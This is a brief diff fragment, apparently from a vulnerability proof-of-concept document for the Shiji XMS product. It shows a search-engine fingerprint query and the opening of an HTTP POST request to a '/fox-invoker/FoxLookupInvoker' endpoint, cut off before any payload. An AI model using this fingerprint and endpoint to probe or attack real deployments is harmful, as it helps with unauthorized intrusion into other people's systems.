@@ -7,7 +7,7 @@
 app="shiji-西软云XMS"
 ```
 
-## poc
+## POC
 ```
 POST /fox-invoker/FoxLookupInvoker/?return-exception=true HTTP/1.1
 Host: 
